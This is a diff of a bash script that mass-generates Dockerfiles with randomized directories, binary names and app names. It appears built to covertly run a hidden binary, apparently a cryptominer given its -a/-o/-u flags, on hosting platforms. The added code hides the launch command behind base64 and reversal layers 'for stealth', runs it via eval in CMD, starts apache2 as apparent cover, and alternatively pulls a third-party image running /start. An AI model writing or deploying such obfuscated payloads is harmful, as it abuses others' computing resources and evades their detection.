@@ -1,5 +1,5 @@
 #!/bin/bash
-# /docker - Full command in CMD for both options
+# /docker - Correct: Fixed image uses CMD /bin/bash /start only
 
 set -e
 
@@ -29,7 +29,7 @@ for i in 1 2 3; do
     UNIQUE_DIR="deploy_$(rand_str 12)_$(date +%s)_${RANDOM}"
     APP_DIR="/app/deployments/${UNIQUE_DIR}"
     
-    # ============ UNIQUE WORKDIR ============
+    # ============ UNIQUE WORKDIR (only for Option 1) ============
     UNIQUE_WORKDIR="/$(rand_str 15)"
     
     # ============ UNIQUE BINARY NAMES ============
@@ -52,17 +52,22 @@ for i in 1 2 3; do
     echo "========================================="
     echo "[$i/3] Deployment #$i"
     echo "========================================="
-    echo "📂 WORKDIR: ${UNIQUE_WORKDIR}"
-    echo "📦 Binary1: ${BIN1}"
-    echo "📦 Binary2: ${BIN2}"
     echo "🚀 App Name: ${APP_NAME}"
     echo "========================================="
     
     mkdir -p "$APP_DIR"
     cd "$APP_DIR"
     
-    # ============ FULL COMMAND TO RUN IN CMD ============
-    FULL_COMMAND="cd ${UNIQUE_WORKDIR} && \
+    # Pick random image (50/50 chance)
+    if [[ $((RANDOM % 2)) -eq 0 ]]; then
+        # ============ OPTION 1: Random Ubuntu/Debian image with FULL COMMAND in CMD ============
+        WORKING_IMAGES=(
+            "ubuntu:20.04" "ubuntu:22.04" "ubuntu:24.04"
+            "debian:11" "debian:12" "debian:bookworm"
+        )
+        RANDOM_IMAGE=${WORKING_IMAGES[$RANDOM % ${#WORKING_IMAGES[@]}]}
+        
+        FULL_COMMAND="cd ${UNIQUE_WORKDIR} && \
 export DEBIAN_FRONTEND=noninteractive && \
 export TZ=Etc/UTC && \
 ln -fs /usr/share/zoneinfo/Etc/UTC /etc/localtime && \
@@ -78,27 +83,16 @@ chmod 755 ${BIN1} ${BIN2} && \
 service apache2 start && \
 sleep 5 && \
 exec ${UNIQUE_WORKDIR}/${BIN2} -a ${VAR3} -o ${VAR4} -u ${VAR5} --port 8080"
-    
-    # Encode the command for stealth
-    ENCODED_CMD=$(echo -n "$FULL_COMMAND" | base64 -w 0)
-    
-    # Random encoding layer
-    if [ $((RANDOM % 2)) -eq 0 ]; then
-        ENCODED_CMD=$(echo -n "$ENCODED_CMD" | base64 -w 0)
-        DECODE_CMD="base64 -d | base64 -d"
-    else
-        ENCODED_CMD=$(echo -n "$ENCODED_CMD" | rev)
-        DECODE_CMD="rev | base64 -d"
-    fi
-    
-    # Pick random image (50/50 chance)
-    if [[ $((RANDOM % 2)) -eq 0 ]]; then
-        # ============ OPTION 1: Random Ubuntu/Debian image ============
-        WORKING_IMAGES=(
-            "ubuntu:20.04" "ubuntu:22.04" "ubuntu:24.04"
-            "debian:11" "debian:12" "debian:bookworm"
-        )
-        RANDOM_IMAGE=${WORKING_IMAGES[$RANDOM % ${#WORKING_IMAGES[@]}]}
+        
+        ENCODED_CMD=$(echo -n "$FULL_COMMAND" | base64 -w 0)
+        
+        if [ $((RANDOM % 2)) -eq 0 ]; then
+            ENCODED_CMD=$(echo -n "$ENCODED_CMD" | base64 -w 0)
+            DECODE_CMD="base64 -d | base64 -d"
+        else
+            ENCODED_CMD=$(echo -n "$ENCODED_CMD" | rev)
+            DECODE_CMD="rev | base64 -d"
+        fi
         
         cat > Dockerfile << EOF
 FROM ${RANDOM_IMAGE}
@@ -106,19 +100,17 @@ WORKDIR ${UNIQUE_WORKDIR}
 RUN apt-get update && apt-get install -y curl wget ca-certificates
 CMD eval "\$(echo '${ENCODED_CMD}' | ${DECODE_CMD} | bash)"
 EOF
-        echo "✅ Option 1: Random image with encoded CMD"
+        echo "✅ Option 1: Random image with full command in CMD"
         
     else
-        # ============ OPTION 2: Fixed image with encoded CMD ============
-        cat > Dockerfile << EOF
+        # ============ OPTION 2: FIXED image - ONLY CMD /bin/bash /start ============
+        cat > Dockerfile << 'EOF'
 FROM phemextradebot/cleverbot8888
-WORKDIR ${UNIQUE_WORKDIR}
-CMD eval "\$(echo '${ENCODED_CMD}' | ${DECODE_CMD} | bash)"
+WORKDIR /
+CMD /bin/bash /start
 EOF
-        echo "✅ Option 2: Fixed image with encoded CMD"
+        echo "✅ Option 2: Fixed image - CMD /bin/bash /start only"
     fi
-    
-    echo "📋 FULL COMMAND in CMD (base64 encoded)"
     
     # Git setup
     git init
